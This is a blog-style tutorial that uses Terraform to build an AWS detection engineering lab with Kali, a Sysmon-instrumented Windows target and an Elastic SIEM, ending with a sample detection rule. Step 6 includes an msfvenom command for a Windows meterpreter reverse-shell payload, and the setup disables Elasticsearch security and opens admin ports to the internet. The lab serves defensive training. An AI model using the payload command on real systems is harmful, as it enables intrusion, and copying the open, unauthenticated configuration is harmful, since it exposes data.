# Building a Cloud-Native Detection Engineering Lab with Terraform and AWS

*How I turned a RAM problem into a fully automated security lab*

---

## The Problem

I was taking a detection engineering course where the instructor had us spin up local VMs — Kali for attacks, Windows as the target, and an ELK stack for log analysis. Great setup. One problem: my laptop doesn't have enough RAM to run all of that without catching fire.

So I did what any cloud-obsessed security person would do: I rebuilt the whole thing in AWS with Terraform.

One command. Fully automated. Attack box, victim, SIEM — all deployed and wired together.

---

## What We're Building

A complete detection engineering lab with three EC2 instances:

| Instance | Role | What's On It |
|----------|------|--------------|
| **Kali Linux** | Attacker | Your offensive toolkit |
| **Windows Server 2025** | Target | Sysmon + Winlogbeat (shipping logs) |
| **Ubuntu 24.04** | SIEM | Elasticsearch + Kibana |

The magic: when you run `terraform apply`, everything installs and configures itself. Windows automatically ships logs to Elastic. You just show up and start hunting.

---

## The Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                        AWS VPC                              │
│                                                             │
│   ┌─────────────┐    attack    ┌─────────────────────┐     │
│   │             │ ──────────── │                     │     │
│   │  Kali Linux │              │   Windows Server    │     │
│   │  (Attacker) │              │   - Sysmon          │     │
│   │             │              │   - Winlogbeat      │     │
│   └─────────────┘              └──────────┬──────────┘     │
│                                           │ logs           │
│                                           ▼                │
│                                ┌─────────────────────┐     │
│                                │   Ubuntu (Elastic)  │     │
│                                │   - Elasticsearch   │     │
│                                │   - Kibana          │     │
│                                └─────────────────────┘     │
│                                           │                │
└───────────────────────────────────────────┼────────────────┘
                                            │
                                            ▼
                                    You, in Kibana,
                                    writing detections
```

---

## Prerequisites

Before we start, you'll need:

- **AWS Account** with credentials configured (`aws configure`)
- **Terraform** installed ([download here](https://developer.hashicorp.com/terraform/install))
- **AWS Key Pair** for SSH/RDP access
- **Security Group** (we'll configure the rules)

---

## Step 1: The Terraform Structure

Here's our project layout:

```
detection-engineering/
├── setup/
│   └── terraform/
│       ├── main.tf           # Infrastructure + bootstrap scripts
│       ├── variables.tf      # Input variables
│       └── terraform.tfvars  # Your specific values
└── detections/               # Your TOML detection rules
```

---

## Step 2: Define the Variables

**variables.tf**
```hcl
variable "aws_region" {
  description = "AWS Region to deploy to"
  type        = string
  default     = "us-east-1"
}

variable "kali_ami" {
  description = "AMI ID for Kali Linux"
  type        = string
}

variable "windows_ami" {
  description = "AMI ID for Windows Server"
  type        = string
}

variable "ubuntu_ami" {
  description = "AMI ID for Ubuntu VM"
  type        = string
}

variable "security_group_id" {
  description = "Security Group ID to attach to instances"
  type        = string
}

variable "key_name" {
  description = "Name of the Key Pair for SSH/RDP access"
  type        = string
}
```

**terraform.tfvars** (your values)
```hcl
aws_region        = "us-east-1"
kali_ami          = "ami-09e99f75cc7592017"    # Kali 2025.4
windows_ami       = "ami-06b5375e3af24939c"    # Windows Server 2025
ubuntu_ami        = "ami-0ecb62995f68bb549"    # Ubuntu 24.04
security_group_id = "sg-xxxxxxxxxxxxxxxxx"     # Your SG
key_name          = "your-key-pair-name"
```

> 💡 **Tip:** Find AMI IDs in the AWS Console under EC2 → AMIs → Public Images. Search for "Kali", "Windows Server 2025", or "Ubuntu 24.04".

---

## Step 3: The Main Infrastructure

Here's where the magic happens. Each instance gets a `user_data` script that runs on first boot.

**main.tf**

```hcl
terraform {
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }
}

provider "aws" {
  region = var.aws_region
}

# ======================
# KALI LINUX (Attacker)
# ======================
resource "aws_instance" "kali_linux" {
  ami                    = var.kali_ami
  instance_type          = "t2.medium"
  vpc_security_group_ids = [var.security_group_id]
  key_name               = var.key_name

  tags = {
    Name        = "Kali Linux"
    Environment = "Detection Engineering Lab"
  }
}

# ======================
# ELASTIC STACK (SIEM)
# ======================
resource "aws_instance" "ubuntu_vm" {
  ami                    = var.ubuntu_ami
  instance_type          = "t2.large"  # Elastic needs RAM
  vpc_security_group_ids = [var.security_group_id]
  key_name               = var.key_name

  user_data = <<-EOF
              #!/bin/bash
              set -e
              exec > /var/log/user-data.log 2>&1

              echo "=== Installing Elastic Stack ==="
              
              # Wait for system
              sleep 30
              
              # Install dependencies
              apt-get update && apt-get install -y apt-transport-https curl gnupg
              
              # Add Elastic repo
              curl -fsSL https://artifacts.elastic.co/GPG-KEY-elasticsearch | \
                gpg --dearmor -o /usr/share/keyrings/elastic.gpg
              echo "deb [signed-by=/usr/share/keyrings/elastic.gpg] https://artifacts.elastic.co/packages/8.x/apt stable main" | \
                tee /etc/apt/sources.list.d/elastic-8.x.list
              
              apt-get update
              
              # Install & configure Elasticsearch
              apt-get install -y elasticsearch
              
              cat > /etc/elasticsearch/elasticsearch.yml <<ESCONFIG
              cluster.name: detection-lab
              node.name: elastic-node
              path.data: /var/lib/elasticsearch
              path.logs: /var/log/elasticsearch
              network.host: 0.0.0.0
              http.port: 9200
              discovery.type: single-node
              xpack.security.enabled: false
              ESCONFIG
              
              systemctl daemon-reload
              systemctl enable elasticsearch
              systemctl start elasticsearch
              
              # Wait for ES to be ready
              until curl -s http://localhost:9200 > /dev/null; do sleep 5; done
              
              # Install & configure Kibana
              apt-get install -y kibana
              
              cat > /etc/kibana/kibana.yml <<KBCONFIG
              server.port: 5601
              server.host: "0.0.0.0"
              server.name: "detection-lab-kibana"
              elasticsearch.hosts: ["http://localhost:9200"]
              KBCONFIG
              
              systemctl enable kibana
              systemctl start kibana
              
              echo "=== Elastic Stack Ready ==="
              EOF

  tags = {
    Name        = "Elastic Stack"
    Environment = "Detection Engineering Lab"
  }
}

# ======================
# WINDOWS SERVER (Target)
# ======================
resource "aws_instance" "windows_server" {
  ami                    = var.windows_ami
  instance_type          = "t2.medium"
  vpc_security_group_ids = [var.security_group_id]
  key_name               = var.key_name
  
  depends_on = [aws_instance.ubuntu_vm]

  user_data = <<-EOF
              <powershell>
              Start-Transcript -Path "C:\user-data-log.txt"
              
              Write-Host "=== Setting Up Windows Sensors ==="
              
              New-Item -ItemType Directory -Path "C:\DetectionLab" -Force
              Set-Location "C:\DetectionLab"
              
              # --- SYSMON ---
              Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "Sysmon.zip"
              Expand-Archive -Path "Sysmon.zip" -DestinationPath ".\Sysmon" -Force
              
              # SwiftOnSecurity config (industry standard)
              Invoke-WebRequest -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" -OutFile "sysmonconfig.xml"
              
              .\Sysmon\Sysmon64.exe -accepteula -i sysmonconfig.xml
              
              # --- WINLOGBEAT ---
              $elasticHost = "${aws_instance.ubuntu_vm.private_ip}:9200"
              $kibanaHost = "${aws_instance.ubuntu_vm.private_ip}:5601"
              
              Invoke-WebRequest -Uri "https://artifacts.elastic.co/downloads/beats/winlogbeat/winlogbeat-8.17.0-windows-x86_64.zip" -OutFile "winlogbeat.zip"
              Expand-Archive -Path "winlogbeat.zip" -DestinationPath "C:\Program Files" -Force
              Rename-Item "C:\Program Files\winlogbeat-8.17.0-windows-x86_64" "C:\Program Files\Winlogbeat"
              
              $config = @"
              winlogbeat.event_logs:
                - name: Application
                - name: System
                - name: Security
                - name: Microsoft-Windows-Sysmon/Operational
                - name: Microsoft-Windows-PowerShell/Operational
                - name: Windows PowerShell
                - name: Microsoft-Windows-WMI-Activity/Operational

              output.elasticsearch:
                hosts: ["http://$elasticHost"]
              
              setup.kibana:
                host: "http://$kibanaHost"
              "@
              
              $config | Out-File -FilePath "C:\Program Files\Winlogbeat\winlogbeat.yml" -Encoding UTF8
              
              Set-Location "C:\Program Files\Winlogbeat"
              PowerShell.exe -ExecutionPolicy Bypass -File .\install-service-winlogbeat.ps1
              
              # Wait for Elastic, then start shipping
              Start-Sleep -Seconds 120
              Start-Service winlogbeat
              
              Write-Host "=== Windows Sensors Ready ==="
              Stop-Transcript
              </powershell>
              EOF

  tags = {
    Name        = "Windows Server"
    Environment = "Detection Engineering Lab"
  }
}

# ======================
# OUTPUTS
# ======================
output "kali_public_ip" {
  value = aws_instance.kali_linux.public_ip
}

output "windows_public_ip" {
  value = aws_instance.windows_server.public_ip
}

output "elastic_public_ip" {
  value = aws_instance.ubuntu_vm.public_ip
}

output "kibana_url" {
  value = "http://${aws_instance.ubuntu_vm.public_ip}:5601"
}
```

---

## Step 4: Security Group Rules

Your security group needs these inbound rules:

| Port | Protocol | Purpose |
|------|----------|---------|
| 22 | TCP | SSH (Kali, Ubuntu) |
| 3389 | TCP | RDP (Windows) |
| 5601 | TCP | Kibana Web UI |
| 9200 | TCP | Elasticsearch API |

You can add these via AWS Console or CLI:

```bash
# SSH
aws ec2 authorize-security-group-ingress \
  --group-id sg-xxxxxxxxx \
  --protocol tcp --port 22 --cidr 0.0.0.0/0

# RDP
aws ec2 authorize-security-group-ingress \
  --group-id sg-xxxxxxxxx \
  --protocol tcp --port 3389 --cidr 0.0.0.0/0

# Kibana
aws ec2 authorize-security-group-ingress \
  --group-id sg-xxxxxxxxx \
  --protocol tcp --port 5601 --cidr 0.0.0.0/0

# Elasticsearch
aws ec2 authorize-security-group-ingress \
  --group-id sg-xxxxxxxxx \
  --protocol tcp --port 9200 --cidr 0.0.0.0/0
```

> ⚠️ **Security Note:** For a real lab, restrict these to your IP (`--cidr YOUR.IP.HERE/32`). Opening to `0.0.0.0/0` is convenient but not secure.

---

## Step 5: Deploy

```bash
cd setup/terraform

# Initialize Terraform
terraform init

# Preview what will be created
terraform plan

# Deploy the lab
terraform apply
```

Type `yes` when prompted. In about 10 minutes, you'll have:
- All three instances running
- Elastic Stack installed and ready
- Sysmon capturing everything on Windows
- Logs flowing into Elasticsearch

Terraform will output your Kibana URL. Open it and you're in.

---

## Step 6: Start Hunting

Now the fun part:

1. **RDP into Windows** — this is your target
2. **SSH into Kali** — this is your attack box
3. **Open Kibana** — this is where you hunt

### Run an attack:

From Kali:
```bash
# Simple port scan
nmap -sV <windows-private-ip>

# Or get spicy with some PowerShell payloads
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<kali-ip> -f psc-cmd
```

### Watch the telemetry:

In Kibana:
1. Go to **Discover**
2. Create an index pattern for `winlogbeat-*`
3. Search for your attack: `process.name: nmap` or `event.code: 1` (Sysmon process creation)

### Write a detection:

```toml
[metadata]
creation_date = "2025/01/25"

[rule]
author = ["Your Name"]
description = "Detects Nmap port scanning activity"
name = "Nmap Network Scan Detected"
risk_score = 50
severity = "medium"
type = "query"
query = "process.name: nmap OR process.command_line: *nmap*"

[[rule.threat]]
framework = "MITRE ATT&CK"
[[rule.threat.technique]]
id = "T1046"
name = "Network Service Discovery"
reference = "https://attack.mitre.org/techniques/T1046/"
```

---

## Cleanup

When you're done (and want to stop AWS charges):

```bash
terraform destroy
```

Everything's gone. Spin it back up anytime with `terraform apply`.

---

## What's Next?

Some ideas to extend this lab:

- **Add Fleet Server** for centralized agent management
- **Install Atomic Red Team** on Windows for easy attack simulation
- **Set up GitHub Actions** to auto-sync your TOML detections to Elastic
- **Add a domain controller** for Active Directory attack scenarios
- **Implement Sigma rules** for vendor-agnostic detections

---

## Final Thoughts

You don't need a beefy laptop to learn detection engineering. With Terraform and AWS, you can have a full lab running in minutes and tear it down when you're done.

The best part? It's all code. Version control your infrastructure, share it with your team, iterate on it. Infrastructure as Code isn't just for DevOps — it's a game changer for security labs too.

Now go write some detections. 🔥

---

*Have questions or improvements? Hit me up on [Twitter/LinkedIn/wherever].*

